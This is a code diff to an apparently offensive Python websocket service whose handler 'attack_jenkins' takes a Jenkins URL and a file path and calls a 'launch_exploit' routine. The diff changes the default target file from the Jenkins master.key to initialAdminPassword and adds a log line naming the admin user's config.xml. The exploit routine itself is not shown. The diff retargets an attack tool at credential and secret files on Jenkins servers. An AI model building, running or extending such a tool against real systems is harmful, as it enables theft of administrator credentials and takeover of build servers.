@@ -15,7 +15,7 @@ async def attack_jenkins(websocket: WebSocket):
         data = json.loads(init_data)
 
         jenkins_url = data.get("jenkins_url")
-        file_path = data.get("file_path", "/home/ubuntu/,jenkins/secrets/master.key")
+        file_path = data.get("file_path", "/home/ubuntu/,jenkins/secrets/initialAdminPassword")
 
         if not jenkins_url:
             await websocket.send_text(json.dumps({"type": "error", "message": "jenkins_url is needed."}))
@@ -23,6 +23,7 @@ async def attack_jenkins(websocket: WebSocket):
             return
 
         await websocket.send_text(json.dumps({"type": "log", "message": f"attack start: {jenkins_url}, file path: {file_path}"}))
+        await websocket.send_text(json.dumps({"type": "log", "message": f"attack start: {jenkins_url}, file path: /home/ubuntu/,jenkins/users/admin/config.xml"}))
 
         report_file = await launch_exploit(jenkins_url, file_path, websocket)
 
